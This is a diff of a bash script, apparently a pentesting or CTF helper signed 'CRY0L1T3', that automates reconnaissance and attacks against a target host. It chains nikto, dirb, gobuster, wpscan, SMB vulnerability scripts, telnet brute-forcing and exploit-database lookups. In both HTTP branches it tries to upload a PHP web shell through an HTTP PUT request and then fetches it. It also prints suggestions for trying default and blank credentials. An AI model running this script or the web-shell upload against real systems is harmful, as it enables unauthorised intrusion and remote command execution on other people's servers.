@@ -5,15 +5,25 @@ clear
 # Check if the required files exist
 
 # Community String
-if [ ! -f community ]; then
+if [ ! -f community ];then
         echo "[+] Creating the community string"
         echo -e "public\nprivate\ncommunity" > community
 else
-	echo "[+] community string exists."
+	echo "[+] community string exists!"
+fi
+
+# GoBuster
+GB=$(dpkg -l gobuster | grep ii | cut -d" " -f3)
+
+if [ $GB != "gobuster" ];then
+	echo "[+] Downloading GoBuster"
+	apt-get install gobuster -y
+else
+	echo "[+] GoBuster exists!"
 fi
 
 # vulscan
-if [ ! -d vulscan ]; then
+if [ ! -d vulscan ];then
         echo "[+] Downloading the Vulscan-Script for Nmap.."
         wget http://computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
         wget http://computec.ch/projekte/vulscan/download/scipvuldb.csv
@@ -47,14 +57,14 @@ fi
 sleep 3s
 clear
 
-echo "#############################################"
-echo "#------------Scanning Script----------------#"
-echo "#-------------------------------------------#"
-echo "#-------------------by----------------------#"
-echo "#-------------------------------------------#"
-echo "#----------------CRY0L1T3-------------------#"
-echo "#-------------------------------------------#"
-echo "#############################################"
+echo -e "\t\t#############################################"
+echo -e "\t\t#------------Scanning Script----------------#"
+echo -e "\t\t#-------------------------------------------#"
+echo -e "\t\t#-------------------by----------------------#"
+echo -e "\t\t#-------------------------------------------#"
+echo -e "\t\t#----------------CRY0L1T3-------------------#"
+echo -e "\t\t#-------------------------------------------#"
+echo -e "\t\t#############################################\n\n"
 
 
 
@@ -177,16 +187,16 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
 	        
         echo "[+] HTTP found!"
 	echo "Scanning..."
-	echo "[+] Nikto is running..."
-	nikto -C all "$TARGET" > $TARGET-http.txt
+	echo -e "\n[+] Nikto is running..."
+	nikto -C all -h "$TARGET" > $TARGET-http.txt
 
-	echo "[+] Get HEADER..."
+	echo -e "\n[+] Get HEADER..."
 	curl -i "$TARGET" > $TARGET-http-header.txt
 
-        echo "[+] Get Everything..."
+        echo -e "\n[+] Get Everything..."
         curl -i -L "$TARGET" > $TARGET-http-all.txt
 
-        echo "[+] Checking for PUT method.."
+        echo -e "\n[+] Checking for PUT method.."
         curl -v -X OPTIONS http://"$TARGET" > $TARGET-http-options.txt
         curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$TARGET/test/shell.php
         curl -i -L http://"$TARGET"/test/shell.php > $TARGET-http-put_shell.txt
@@ -199,25 +209,25 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
         fi
 
 
-        echo "[+] Uniscan is running..."
+        echo -e "\n[+] Uniscan is running..."
         uniscan -u http://"$TARGET" -qweds >> $TARGET-http.txt
 
-        echo "[+] Nmap vulscan running..."
+        echo -e "\n[+] Nmap vulscan running..."
         nmap --script "$(pwd)"/vulscan/vulscan.nse --script-args="$(pwd)"/vulscan/scipvuldb.csv "$TARGET" > $TARGET-vulscan.txt
 
-        echo "[+] Directory bruteforcing with dirb..."
-        dirb http://"$TARGET" /usr/share/wordlists/dirb/common.txt > $TARGET-dirs.txt
+        echo -e "\n[+] Directory bruteforcing with dirb..."
+        dirb http://"$TARGET" /usr/share/wordlists/dirb/common.txt | grep -v "Testing" > $TARGET-dirs.txt
 
-        echo "[+] Directory bruteforcing with gobuster..."
-        gobuster -u http://"$TARGET" -w /usr/share/seclists/Discovery/Web_Content/common.txt -s "200,204,301,302,307,403,500" -e "403"
+        echo -e "\n[+] Directory bruteforcing with gobuster..."
+        gobuster -u http://"$TARGET" -w /usr/share/seclists/Discovery/Web_Content/common.txt -s "200,204,301,302,307,403,500" -e "403" > $TARGET-gobuster.txt
 
-        echo "[+] Kernel Scanning..."
+        echo -e "\n[+] Kernel Scanning..."
         xprobe2 -v -p tcp:80:open "$TARGET" > $TARGET-kernel.txt
 
 
         if grep -q "wp" $TARGET-http.txt;then
-            echo "[+] WordPress found!"
-            echo "Scanning..."
+            echo -e "\n[+] WordPress found!"
+            echo "Scanning... (type ENTER after few minutes)"
             wpscan -url http://"$TARGET" --enumerate p > $TARGET-http-wordpress.txt
         fi
         
@@ -228,7 +238,7 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
 
 
     # HTTPS
-    if grep -q "https" $TARGET-light.txt; then
+    if grep -q "443" $TARGET-light.txt; then
 
         echo "[+] HTTPS found!"
         echo "Scanning..."
@@ -262,7 +272,7 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
 
         echo "[+] SMB found!"
         echo "Scanning..."
-        nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse "$TARGET" -p137-139,445 > $TARGET-smb.txt
+        nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse "$TARGET" -p137-139,445 > $TARGET-smb.txt
 		
         enum4linux -a "$TARGET" >> $TARGET-smb.txt
 
@@ -273,7 +283,6 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
 
         cat $TARGET-smb_users.txt >> $TARGET-userlist.txt
 
-        echo "\n\n#############################"
         echo "Try to login for example with:\nrpcclient -U '' $TARGET\nor\nsmbclient -L $TARGET\nsmbclient //$TARGET\nsmbclient \\\\$TARGET\\ipc$ -U john\nsmbclient //$TARGET/ipc$ -U john\n" >> $TARGET-smb.txt
         echo ""
         
@@ -311,7 +320,6 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
         echo "Scanning..."
 
         nmap -sU --script ms-sql-info "$TARGET" -p 1433 > $TARGET-mssql.txt
-        echo "\n\n#############################"
         echo "Try to login for example with:\nsqsh -S $TARGET -U sa" >> $TARGET-mssql.txt
 
         MSSQL=true
@@ -325,9 +333,8 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
 
         echo "[+] MySQL found!"
         echo "Scanning..."
-        nmap -sV -Pn -script mysql* "$TARGET" > $TARGET-mysql.txt
+        nmap -sV -Pn -script mysql* "$TARGET" -p 3306 > $TARGET-mysql.txt
 
-        echo "\n\n#############################"
         echo "Try to login for example with:\nmysql --host=$TARGET -u root -p" >> $TARGET-mysql.txt
 
         MYSQL=true
@@ -343,7 +350,6 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
         echo "Scanning..."
         nmap --script rdp* -p 3389 "$TARGET" > $TARGET-rdp.txt
 
-        echo "\n\n#############################"
         echo "Try to login for example with:\nrdesktop -u guest -p guest $TARGET -g 94%" >> $TARGET-mysql.txt
 
         RDP=true
@@ -368,7 +374,7 @@ if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
     clear
 
     echo "Starting Heavy Scan for $TARGET in the background...\nYou should take a coffee.. or 10..."
-    nmap --script discover,vuln -sSU -p- "$TARGET" > $TARGET-heavy.txt  
+    nmap --script discovery,vuln -sSU -p- "$TARGET" > $TARGET-heavy.txt  
     
     echo "[+] Heavy Scan Done!"
 
@@ -406,7 +412,7 @@ else
 
         echo "[+] Telnet found!"
         echo "Scanning..."
-        nmap --script=telnet-brute,telnet-encryption,telnet-ntlm-info "$TARGET" --dns-servers "$DNS" > $TARGET-telnet.txt
+        nmap --script=telnet-brute,telnet-encryption,telnet-ntlm-info "$TARGET" -p23 --dns-servers "$DNS" > $TARGET-telnet.txt
 
         TELNET=true
 
@@ -471,36 +477,34 @@ else
 
         echo "[+] Checking for PUT method.."
         curl -v -X OPTIONS http://"$TARGET" > $TARGET-http-options.txt
-        curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$TARGET/test/shell.php
-        curl -i -L http://"$TARGET"/test/shell.php > $TARGET-http-put_shell.txt
+        curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$TARGET/test/shell.php > $TARGET-http-put_shell.txt
+        curl -i -L http://"$TARGET"/test/shell.php >> $TARGET-http-put_shell.txt
 
 
-        if [ -f $TARGET-http-put_shell.txt ];then
-            cat $TARGET-http-put_shell.txt
-        else
+        if [ ! -f $TARGET-http-put_shell.txt ];then
             echo "[-] PUT Method doesn't work. :("
         fi
 
 
-        echo "[+] Uniscan is running..."
-        uniscan -u http://"$TARGET" -qweds >> $TARGEt-http.txt
+        echo -e "\n[+] Uniscan is running..."
+        uniscan -u http://"$TARGET" -qweds >> $TARGET-http.txt
 
-        echo "[+] Nmap vulscan running..."
-        nmap --script $(pwd)/vulscan/vulscan.nse --script-args=$(pwd)/vulscan/scipvuldb.csv "$TARGET" --dns-servers "$DNS" > $TARGET-vulscan.txt
+        echo -e "\n[+] Nmap vulscan running..."
+        nmap --script "$(pwd)"/vulscan/vulscan.nse --script-args="$(pwd)"/vulscan/scipvuldb.csv "$TARGET" --dns-servers "$DNS" > $TARGET-vulscan.txt
 
-        echo "[+] Directory bruteforcing with dirb..."
-        dirb http://"$TARGET" /usr/share/wordlists/dirb/common.txt > $TARGET-dirs.txt
+        echo -e "\n[+] Directory bruteforcing with dirb..."
+        dirb -w http://"$TARGET" /usr/share/wordlists/dirb/common.txt > $TARGET-dirs.txt
 
-        echo "[+] Directory bruteforcing with gobuster..."
+        echo -e "\n[+] Directory bruteforcing with gobuster..."
         gobuster -u http://"$TARGET" -w /usr/share/seclists/Discovery/Web_Content/common.txt -s "200,204,301,302,307,403,500" -e "403"
 
-        echo "[+] Kernel Scanning..."
+        echo -e "\n[+] Kernel Scanning..."
         xprobe2 -v -p tcp:80:open "$TARGET" > $TARGET-kernel.txt
 
 
         if grep -q "wp" $TARGET-http.txt;then
 
-            echo "[+] WordPress found!"
+            echo -e "\n[+] WordPress found!"
             echo "Scanning..."
             wpscan -url http://"$TARGET" --enumerate p > $TARGET-http-wordpress.txt
         fi
@@ -512,7 +516,7 @@ else
 
 
     # HTTPS
-    if grep -q "https" $TARGTET-light.txt; then
+    if grep -q "443" $TARGET-light.txt; then
 
         echo "[+] HTTPS found!"
         echo "Scanning..."
@@ -546,7 +550,7 @@ else
 
         echo "[+] SMB found!"
         echo "Scanning..."
-        nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse "$TARGET" -p137-139,445 --dns-servers "$DNS" > $TARGET-smb.txt
+        nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse "$TARGET" -p137-139,445 --dns-servers "$DNS" > $TARGET-smb.txt
 
         enum4linux -a "$TARGET" >> $TARGET-smb.txt
 
@@ -557,7 +561,6 @@ else
 
         cat $TARGET-smb_users.txt >> $TARGET-userlist.txt
 
-        echo "\n\n#############################"
         echo "Try to login for example with:\nrpcclient -U '' $TARGET\nor\nsmbclient -L $TARGET\nsmbclient //$TARGET\nsmbclient \\\\$TARGET\\ipc$ -U john\nsmbclient //$TARGET/ipc$ -U john\n" >> $TARGET-smb.txt
 
         echo ""
@@ -596,7 +599,6 @@ else
         echo "Scanning..."
         nmap -sU --script ms-sql-info "$TARGET" -p 1433 --dns-servers "$DNS" > $TARGET-mssql.txt
 
-        echo "\n\n#############################"
         echo "Try to login for example with:\nsqsh -S $TARGET -U sa" >> $TARGET-mssql.txt
 
         MSSQL=true
@@ -612,7 +614,6 @@ else
         echo "Scanning..."
         nmap -sV -Pn -script mysql* "$TARGET" --dns-servers "$DNS" > $TARGET-mysql.txt
 
-        echo "\n\n#############################"
         echo "Try to login for example with:\nmysql --host=$TARGET -u root -p" >> $TARGET-mysql.txt
 
         MYSQL=true
@@ -628,7 +629,6 @@ else
         echo "Scanning..."
         nmap --script rdp* -p 3389 "$TARGET" --dns-servers "$DNS" > $TARGET-rdp.txt
 
-        echo "\n\n#############################"
         echo "Try to login for example with:\nrdesktop -u guest -p guest $TARGET -g 94%" >> $TARGET-mysql.txt
 
         RDP=true
@@ -651,8 +651,8 @@ else
 
 
     ### Heavy Scan ###
-    echo "Starting Heavy Scan for $TARGET in the background...\nYou should take a coffee.. or 10..."
-    nmap --script discover,vuln -sSU -p- "$TARGET" --dns-servers "$DNS"> $TARGET-heavy.txt  
+    echo -e "Starting Heavy Scan for $TARGET in the background...You should take a coffee.. or 10..."
+    nmap --script discovery,vuln -sSU -p- "$TARGET" --dns-servers "$DNS"> $TARGET-heavy.txt &
     
     echo "[+] Heavy Scan Done!"
 
@@ -768,4 +768,6 @@ clear
 
 ### Vuln research ###
 echo "[+] Vulnerability Research"
-nmap --script $(pwd)/vulscan/vulscan.nse --script-args=exploitdb.csv,cve.csv,securityfocus.csv "$TARGET" > $TARGET-vulscan.txt;
+nmap --script "$(pwd)"/vulscan/vulscan.nse --script-args="$(pwd)"/vulscan/exploitdb.csv "$TARGET" > $TARGET-vulscan.txt;
+
+
